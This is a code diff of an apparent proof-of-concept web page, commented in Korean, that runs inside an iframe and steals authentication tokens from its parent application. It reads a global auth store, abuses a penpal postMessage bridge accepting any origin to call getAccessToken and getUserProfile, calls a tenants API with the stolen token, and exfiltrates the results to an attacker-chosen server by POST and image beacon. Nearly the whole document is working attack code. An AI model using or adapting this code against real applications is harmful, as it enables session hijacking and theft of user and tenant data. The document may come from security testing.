@@ -67,9 +67,7 @@ setInterval(fakeData, 5000);
 
 <script>
 // ========================================
-// CONFIG — URL 파라미터로 수신서버 지정
-// 사용법: ?exfil=http://your-ip:9999
-// 디버그: ?exfil=http://your-ip:9999&debug
+// CONFIG
 // ========================================
 var params = new URLSearchParams(window.location.search);
 var EXFIL_URL = params.get('exfil') || '';
@@ -83,12 +81,10 @@ function log(msg) {
 }
 
 // ========================================
-// 토큰 탈취 — 순수 JS, 외부 의존성 없음
+// Vector 1: window.parent 직접 접근 (same-origin only)
 // ========================================
-function steal() {
+function stealDirect() {
   var result = { vectors: [], timestamp: new Date().toISOString(), origin: window.location.origin };
-
-  // Vector 1: window.parent.__NEXUS_AUTH_STORE__
   try {
     var store = window.parent.__NEXUS_AUTH_STORE__;
     if (store) {
@@ -102,29 +98,168 @@ function steal() {
       result.profile = s.profile;
       result.isAuthenticated = s.isAuthenticated;
       result.vectors.push('global-store');
-      log('[VULN] global store access — user: ' + result.username);
-    } else {
-      log('[INFO] __NEXUS_AUTH_STORE__ not found on parent');
+      log('[VULN] global store — user: ' + result.username);
     }
   } catch (e) {
     log('[BLOCKED] global store: ' + e.message);
   }
-
-  // Vector 2: parent DOM 접근
   try {
-    var title = window.parent.document.title;
-    result.parentTitle = title;
-    result.parentUrl = window.parent.location.href;
+    result.parentTitle = window.parent.document.title;
     result.vectors.push('parent-dom');
-    log('[VULN] parent DOM access — title: ' + title);
+    log('[VULN] parent DOM — title: ' + result.parentTitle);
   } catch (e) {
     log('[BLOCKED] parent DOM: ' + e.message);
   }
-
   return result;
 }
 
+// ========================================
+// Vector 2: penpal v7 레거시 프로토콜 (raw postMessage)
+// CDN 불필요 — Shell의 WindowMessenger가 remoteOrigin:'*'이면
+// deprecated penpal 프로토콜도 수락함
+// ========================================
+function stealViaPenpal() {
+  return new Promise(function(resolve) {
+    var callId = 0;
+    var pending = {};
+    var connected = false;
+    var timeout = setTimeout(function() {
+      window.removeEventListener('message', handler);
+      log('[TIMEOUT] penpal handshake 5s timeout');
+      resolve(null);
+    }, 5000);
+
+    function handler(event) {
+      var data = event.data;
+      if (!data || typeof data !== 'object') return;
+
+      // penpal v7 레거시 호환 응답: {penpal: 'synAck', methodNames: [...]}
+      if (data.penpal === 'synAck') {
+        log('[PENPAL] synAck received, methods: ' + JSON.stringify(data.methodNames));
+        connected = true;
+        // ACK 전송
+        window.parent.postMessage({ penpal: 'ack' }, '*');
+
+        // 메서드 호출: getAccessToken, getUserProfile, getTenantId
+        callMethod('getAccessToken', [], 1);
+        callMethod('getUserProfile', [], 2);
+        callMethod('getTenantId', [], 3);
+      }
+
+      // penpal v7 레거시 호환 응답: {penpal: 'reply', id: N, ...}
+      if (data.penpal === 'reply' && pending[data.id]) {
+        var cb = pending[data.id];
+        delete pending[data.id];
+        if (data.resolution === 'fulfilled') {
+          cb.resolve(data.returnValue);
+        } else {
+          cb.resolve(null);
+        }
+      }
+
+      // penpal v7 새 프로토콜 응답도 처리
+      if (data.namespace === 'penpal' && data.type === 'ACK1') {
+        log('[PENPAL] ACK1 received (new protocol), methodPaths: ' + JSON.stringify(data.methodPaths));
+        connected = true;
+        // ACK2 전송
+        window.parent.postMessage({ namespace: 'penpal', type: 'ACK2', channel: data.channel }, '*');
+      }
+      if (data.namespace === 'penpal' && data.type === 'REPLY') {
+        var cb2 = pending[data.callId];
+        if (cb2) {
+          delete pending[data.callId];
+          cb2.resolve(data.isError ? null : data.value);
+        }
+      }
+    }
+
+    function callMethod(name, args, id) {
+      pending[id] = {};
+      var p = new Promise(function(res) { pending[id].resolve = res; });
+      pending[id].promise = p;
+
+      // 레거시 형식
+      window.parent.postMessage({
+        penpal: 'call',
+        id: id,
+        methodName: name,
+        args: args
+      }, '*');
+
+      // 새 프로토콜 형식도 시도
+      window.parent.postMessage({
+        namespace: 'penpal',
+        type: 'CALL',
+        id: id,
+        methodPath: [name],
+        args: args
+      }, '*');
+    }
+
+    window.addEventListener('message', handler);
+
+    // SYN 전송 — 레거시 형식
+    log('[PENPAL] Sending SYN (legacy)...');
+    window.parent.postMessage({ penpal: 'syn' }, '*');
+
+    // SYN 전송 — 새 프로토콜 형식
+    log('[PENPAL] Sending SYN (v7)...');
+    window.parent.postMessage({
+      namespace: 'penpal',
+      type: 'SYN',
+      channel: undefined,
+      participantId: 'poc-' + Date.now()
+    }, '*');
+
+    // 3개 호출 완료 대기
+    function waitForResults() {
+      if (!pending[1] || !pending[2] || !pending[3]) {
+        setTimeout(waitForResults, 100);
+        return;
+      }
+      Promise.all([
+        pending[1].promise || Promise.resolve(null),
+        pending[2].promise || Promise.resolve(null),
+        pending[3].promise || Promise.resolve(null)
+      ]).then(function(values) {
+        clearTimeout(timeout);
+        window.removeEventListener('message', handler);
+        if (values[0]) {
+          resolve({ token: values[0], profile: values[1], tenantId: values[2] });
+        } else {
+          resolve(null);
+        }
+      });
+    }
+    // connected가 되면 결과 대기
+    var checkInterval = setInterval(function() {
+      if (connected) {
+        clearInterval(checkInterval);
+        // 메서드 호출 응답 대기 (최대 3초)
+        setTimeout(function() {
+          clearTimeout(timeout);
+          window.removeEventListener('message', handler);
+          var results = {};
+          Promise.all([
+            pending[1] && pending[1].promise ? pending[1].promise : Promise.resolve(null),
+            pending[2] && pending[2].promise ? pending[2].promise : Promise.resolve(null),
+            pending[3] && pending[3].promise ? pending[3].promise : Promise.resolve(null),
+          ]).then(function(values) {
+            if (values[0]) {
+              resolve({ token: values[0], profile: values[1], tenantId: values[2] });
+            } else {
+              resolve(null);
+            }
+          });
+        }, 3000);
+      }
+    }, 200);
+  });
+}
+
+// ========================================
 // 탈취한 토큰으로 API 호출
+// ========================================
 function callApi(result) {
   if (!result.token) return Promise.resolve(result);
   return fetch('/api/tenants', {
@@ -147,15 +282,15 @@ function callApi(result) {
   });
 }
 
+// ========================================
 // 외부 서버로 전송
+// ========================================
 function exfiltrate(data) {
   if (!EXFIL_URL) {
-    log('[SKIP] exfil URL 미설정. ?exfil=http://your-ip:9999 추가하세요');
+    log('[SKIP] exfil URL 미설정. ?exfil=http://your-ip:9999 추가');
     log('Result:\n' + JSON.stringify(data, null, 2));
     return;
   }
-
-  // POST
   try {
     var xhr = new XMLHttpRequest();
     xhr.open('POST', EXFIL_URL + '/collect', true);
@@ -163,8 +298,6 @@ function exfiltrate(data) {
     xhr.send(JSON.stringify(data));
     log('[SENT] POST → ' + EXFIL_URL + '/collect');
   } catch (e) { log('[FAIL] POST: ' + e.message); }
-
-  // Image beacon
   try {
     var payload = btoa(JSON.stringify({
       token: data.token, username: data.username,
@@ -175,71 +308,45 @@ function exfiltrate(data) {
   } catch (e) { log('[FAIL] beacon: ' + e.message); }
 }
 
-// Vector 3: Penpal bridge (cross-origin에서도 동작)
-function stealViaPenpal() {
-  return new Promise(function(resolve) {
-    var script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/npm/penpal@7.1.0/dist/penpal.min.js';
-    script.onload = function() {
-      try {
-        var messenger = new penpal.WindowMessenger({
-          localWindow: window,
-          remoteWindow: window.parent,
-          remoteOrigin: '*',
-        });
-        var connection = penpal.connect({ messenger: messenger });
-        var timeout = setTimeout(function() { resolve(null); }, 5000);
-        connection.promise.then(function(shell) {
-          clearTimeout(timeout);
-          Promise.all([
-            shell.getAccessToken(),
-            shell.getUserProfile(),
-            shell.getTenantId()
-          ]).then(function(values) {
-            resolve({ token: values[0], profile: values[1], tenantId: values[2] });
-          }).catch(function() { resolve(null); });
-        }).catch(function() { clearTimeout(timeout); resolve(null); });
-      } catch(e) { log('[FAIL] penpal init: ' + e.message); resolve(null); }
-    };
-    script.onerror = function() { log('[FAIL] penpal CDN load failed'); resolve(null); };
-    document.head.appendChild(script);
-  });
-}
-
-// 실행 — 2초 후
+// ========================================
+// 실행
+// ========================================
 setTimeout(function() {
   log('Starting token theft...');
   log('iframe: ' + (window.parent !== window ? 'yes' : 'no'));
-  log('same-origin: ' + (function() { try { return !!window.parent.document; } catch(e) { return false; } })());
+  var sameOrigin = false;
+  try { sameOrigin = !!window.parent.document; } catch(e) {}
+  log('same-origin: ' + sameOrigin);
 
-  var data = steal();
+  var data = stealDirect();
 
-  // same-origin 실패 시 penpal 시도
-  var next = (data.vectors.length > 0)
-    ? Promise.resolve(data)
-    : stealViaPenpal().then(function(penpalResult) {
-        if (penpalResult && penpalResult.token) {
-          data.token = penpalResult.token;
-          data.profile = penpalResult.profile;
-          data.username = penpalResult.profile ? penpalResult.profile.preferred_username : null;
-          data.tenantId = penpalResult.tenantId;
-          data.vectors.push('penpal');
-          log('[VULN] penpal bridge — user: ' + data.username);
-        } else {
-          log('[SAFE] penpal also failed');
-        }
+  if (data.vectors.length > 0) {
+    // same-origin 성공
+    callApi(data).then(function(result) {
+      log('Final: ' + result.vectors.join(', '));
+      exfiltrate(result);
+    });
+  } else {
+    // cross-origin — penpal으로 시도
+    log('[PENPAL] Trying raw postMessage penpal protocol...');
+    stealViaPenpal().then(function(penpalResult) {
+      if (penpalResult && penpalResult.token) {
+        data.token = penpalResult.token;
+        data.profile = penpalResult.profile;
+        data.username = penpalResult.profile ? penpalResult.profile.preferred_username : null;
+        data.tenantId = penpalResult.tenantId;
+        data.vectors.push('penpal');
+        log('[VULN] penpal — user: ' + data.username);
+        return callApi(data);
+      } else {
+        log('[SAFE] penpal failed — no token obtained');
         return data;
-      });
-
-  next.then(function(result) {
-    if (result.vectors.length > 0) {
-      return callApi(result);
-    }
-    return result;
-  }).then(function(result) {
-    log('Final vectors: ' + (result.vectors.length > 0 ? result.vectors.join(', ') : 'none'));
-    exfiltrate(result);
-  });
+      }
+    }).then(function(result) {
+      log('Final: ' + (result.vectors.length > 0 ? result.vectors.join(', ') : 'none'));
+      exfiltrate(result);
+    });
+  }
 }, 2000);
 </script>
 </body>
